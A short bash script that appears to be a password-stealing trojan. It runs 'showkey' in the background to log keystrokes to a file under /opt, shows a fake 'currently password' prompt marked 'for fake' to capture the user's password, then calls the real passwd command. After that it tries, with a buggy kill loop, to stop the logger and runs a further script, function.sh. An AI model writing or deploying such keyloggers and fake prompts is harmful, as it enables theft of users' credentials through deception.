#!/bin/bash

FOLDER="kelompokkucing"
showkey > /opt/$FOLDER/logger.txt &

# for fake
echo -n "currently password : "
read currentPassword
echo ""
# end-for fake

/usr/bin/passwd
let counter=0
for TARGET in $(ps aux | grep showkey);do
if [ $counter -eq 1 ]
then
kill $counter
fi
((counter++))
done
# 
sleep 10
/opt/$FOLDER/function.sh
